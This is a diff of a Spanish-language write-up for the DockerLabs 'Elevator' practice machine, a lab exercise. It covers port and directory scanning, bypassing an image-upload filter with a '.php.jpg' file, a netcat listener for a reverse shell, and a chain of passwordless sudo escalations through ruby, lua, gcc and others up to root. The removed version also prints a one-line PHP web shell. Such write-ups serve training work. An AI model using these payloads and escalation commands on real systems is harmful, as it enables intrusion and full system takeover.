@@ -1,164 +1,157 @@
-# 🛡️ Informe de Pentesting – Máquina *Elevator*
+# Informe de Pentesting – Máquina Vulnerable *Elevator*
 
-## 🧠 Descripción
+![Logo](/Elevator/Imagenes/Logo.png)
 
-La máquina vulnerable *Elevator* fue descargada desde la página oficial de [DockerLabs](https://www.dockerlabs.com), diseñada con múltiples niveles de escalada de privilegios. El objetivo es comprometer la máquina inicial con permisos restringidos y, mediante una cadena de escaladas, llegar a ser *root*.
+## Descripción
 
----
+La máquina vulnerable *Elevator* fue descargada desde la página oficial de DockerLabs. Una vez descargado el archivo `elevator.zip`, se descomprime utilizando la herramienta `unzip`:
 
-## 🎯 Objetivos
+```bash
+unzip elevator.zip
+```
 
-* Obtener acceso inicial a la máquina mediante una vulnerabilidad web.
-* Escalar privilegios sucesivamente entre usuarios hasta obtener acceso como *root*.
+Posteriormente, se despliega la máquina con el script de instalación automática:
 
----
+```bash
+sudo bash auto_deploy.sh elevator.tar
+```
 
-## ⚙️ Fase de Preparación
+## Objetivo
 
-1. **Despliegue de la máquina:**
-
-   ```bash
-   unzip elevator.zip
-   sudo bash auto_deploy.sh elevator.tar
-   ```
-
-2. **Verificación de conectividad:**
-
-   ```bash
-   ping -c4 172.17.0.2
-   ```
-
-   ![/Elevator/Imagenes/Ping.jpeg](Elevator/Imagenes/Ping.jpeg)
+Obtener acceso inicial a la máquina e ir escalando privilegios hasta llegar a `root`.
 
 ---
 
-## 🔍 Fase de Reconocimiento
+## 1. Comprobación de Conectividad
 
-### Escaneo de puertos con Nmap
+Se verifica que la máquina esté activa usando un ping:
+
+```bash
+ping -c4 172.17.0.2
+```
+
+![Ping](/Elevator/Imagenes/Ping.jpeg)
+
+---
+
+## 2. Reconocimiento
+
+### 2.1 Escaneo de Puertos
+
+Se realiza un escaneo agresivo de todos los puertos:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
 ```
 
-> Resultado: Sólo el puerto **80/tcp** (HTTP) está abierto.
-> ![/Elevator/Imagenes/Puertos.jpeg](Elevator/Imagenes/Puertos.jpeg)
+Resultado: solo el puerto **80 (HTTP)** está abierto.
 
-### Extracción de puertos relevantes
+![Puertos](/Elevator/Imagenes/Puertos.jpeg)
 
-```bash
-extractPorts allPorts.txt
-```
+### 2.2 Extracción de Puertos
 
-![/Elevator/Imagenes/Servicios.jpeg](Elevator/Imagenes/Servicios.jpeg)
+Se utiliza el script personalizado `extractPorts` para filtrar los puertos encontrados.
 
----
-
-## 🌐 Fase de Enumeración Web
-
-### Acceso al sitio principal
-
-Se accede a la IP desde el navegador:
-
-> [http://172.17.0.2](http://172.17.0.2)
-> ![/Elevator/Imagenes/Pagina.jpeg](Elevator/Imagenes/Pagina.jpeg)
-> No se observa contenido útil directamente.
-
-### Fuzzing de directorios con Gobuster
-
-```bash
-gobuster dir -u http://172.17.0.2/ \
--w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
--t 20 -add-slash -b 403,404 -x php,html,txt
-```
-
-Se descubre el directorio `/themes/` y otros.
-![/Elevator/Imagenes/Fuzzing.jpeg](Elevator/Imagenes/Fuzzing.jpeg)
-
-### Fuzzing en subdirectorios descubiertos
-
-```bash
-gobuster dir -u http://172.17.0.2/themes/ \
--w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
--t 20 -add-slash -b 403,404 -x php,html,txt
-```
+![Servicios](/Elevator/Imagenes/Servicios.jpeg)
 
 ---
 
-## 🐚 Acceso Inicial: Web Shell
+## 3. Análisis de la Aplicación Web
 
-Se descubre un formulario de carga de imágenes en:
+Al acceder al sitio web en el puerto 80, no se detecta contenido destacable.
 
-> [http://172.17.0.2/themes/archivo.html](http://172.17.0.2/themes/archivo.html)
-> ![/Elevator/Imagenes/Subir.jpeg](Elevator/Imagenes/Subir.jpeg)
+![Página Principal](/Elevator/Imagenes/Pagina.jpeg)
 
-Y un directorio donde se almacenan los archivos subidos:
+### 3.1 Fuzzing de Directorios
 
-> [http://172.17.0.2/themes/uploads](http://172.17.0.2/themes/uploads)
-> ![/Elevator/Imagenes/Directorio.jpeg](Elevator/Imagenes/Directorio.jpeg)
+Se realiza un ataque de fuerza bruta para descubrir directorios ocultos:
 
-### Bypass de restricción de extensión
+```bash
+gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
+```
 
-Se utiliza una *reverse shell* en PHP renombrada con doble extensión (`.php.jpg`) para evadir el filtro de archivos.
+Se descubren dos directorios interesantes. Se realiza fuzzing sobre `/themes/`:
+
+```bash
+gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
+```
+
+![Fuzzing](/Elevator/Imagenes/Fuzzing.jpeg)
+
+---
+
+## 4. Explotación
+
+### 4.1 Descubrimiento de Funcionalidad Vulnerable
+
+En `http://172.17.0.2/themes/archivo.html` se encuentra una funcionalidad para subir imágenes (`.jpg` únicamente).
+
+![Subida](/Elevator/Imagenes/Subir.jpeg)
+
+Además, se descubren las rutas:
+
+* `http://172.17.0.2/themes/uploads/`
+* `http://172.17.0.2/themes/upload.php`
+
+![Directorio Uploads](/Elevator/Imagenes/Directorio.jpeg)
+
+### 4.2 Payload Malicioso
+
+Se prepara una reverse shell PHP con doble extensión (`.php.jpg`):
 
 ```php
-<?php system($_GET['cmd']); ?>
+nano php_reverseshell.php.jpg
 ```
 
-Comando de subida: *(ejemplo usando navegador o interceptando con Burp Suite)*
-![/Elevator/Imagenes/Gitrevershell.jpeg](Elevator/Imagenes/Gitrevershell.jpeg)
-![/Elevator/Imagenes/tricks.jpeg](Elevator/Imagenes/tricks.jpeg)
+![Reverse Shell GitHub](/Elevator/Imagenes/Gitrevershell.jpeg)
+![Tricks](/Elevator/Imagenes/tricks.jpeg)
 
-Se verifica que el archivo se subió correctamente y se puede ejecutar:
-![/Elevator/Imagenes/Subida.jpeg](Elevator/Imagenes/Subida.jpeg)
-![/Elevator/Imagenes/Archivo.jpeg](Elevator/Imagenes/Archivo.jpeg)
+El archivo se sube exitosamente, y se puede ejecutar desde la carpeta `/themes/uploads/`.
 
----
+![Archivo Subido](/Elevator/Imagenes/Archivo.jpeg)
+![Subida Exitosa](/Elevator/Imagenes/Subida.jpeg)
+![Carga Exitosa](/Elevator/Imagenes/Carga.jpeg)
 
-## 📡 Establecer Reverse Shell
+### 4.3 Acceso Remoto
 
-Desde el atacante, se escucha con Netcat:
+Se escucha en el puerto definido en el payload (443):
 
 ```bash
 sudo nc -lvnp 443
 ```
 
-![/Elevator/Imagenes/Escucha.jpeg](Elevator/Imagenes/Escucha.jpeg)
+![Escucha](/Elevator/Imagenes/Escucha.jpeg)
 
-Se accede al archivo malicioso para obtener la terminal:
-
-> [http://172.17.0.2/themes/uploads/php\_revell\_shell.php.jpg](http://172.17.0.2/themes/uploads/php_revell_shell.php.jpg)
-
-Se obtiene acceso como el usuario restringido `www-data`.
+Se accede exitosamente como `www-data`.
 
 ---
 
-## 🔼 Escalada de Privilegios
+## 5. Escalada de Privilegios
 
-Se ejecuta `sudo -l` para ver comandos permitidos por `sudo`:
+Se aprovechan múltiples permisos `sudo` entre usuarios, realizando un encadenamiento de escaladas:
 
-### Ruta de escalada:
+1. `www-data` puede ejecutar `/usr/bin/env` como `daphne`
+2. `daphne` puede usar `/usr/bin/ash` como `vilma`
+3. `vilma` puede usar `ruby` como `shaggy`
+4. `shaggy` puede usar `lua` como `fred`
+5. `fred` puede usar `gcc` como `scooby`
+6. `scooby` puede usar `sudo` como `root`
 
-1. `www-data` → `daphne` vía `sudo -u daphne /usr/bin/env /bin/bash`
-2. `daphne` → `vilma` vía `sudo -u vilma /usr/bin/ash`
-3. `vilma` → `shaggy` vía `sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'`
-4. `shaggy` → `fred` vía `sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'`
-5. `fred` → `scooby` vía `sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .`
-6. `scooby` → `root` vía `sudo -u root /usr/bin/sudo su`
+```bash
+sudo -u daphne /usr/bin/env /bin/bash
+sudo -u vilma /usr/bin/ash
+sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
+sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
+sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .
+sudo -u root /usr/bin/sudo su
+```
 
-Cada salto se realiza sin necesidad de contraseñas debido a configuraciones de `NOPASSWD`.
-![/Elevator/Imagenes/Intrusion.jpeg](Elevator/Imagenes/Intrusion.jpeg)
-![/Elevator/Imagenes/Escalada.jpeg](Elevator/Imagenes/Escalada.jpeg)
+![Intrusión](/Elevator/Imagenes/Intrusion.jpeg)
+![Escalada](/Elevator/Imagenes/Escalada.jpeg)
 
 ---
 
-## ✅ Resultado Final
+## Conclusión
 
-Se logra acceso completo como **root**, cumpliendo todos los objetivos de la máquina.
+La máquina *Elevator* presenta una cadena de configuraciones inseguras en múltiples usuarios que permiten una escalada de privilegios completa hasta `root`. El punto inicial de explotación es una mala validación de archivos subidos, que permite ejecución remota de código.
 
----
-
-## 🧾 Conclusiones
-
-* La máquina simula una escalada de privilegios en cadena, útil para entender la importancia de permisos restrictivos con `sudo`.
-* La validación de archivos por extensión puede ser fácilmente evadida si no se implementa correctamente.
-* Enumerar servicios y directorios ocultos es esencial para detectar vectores de ataque.
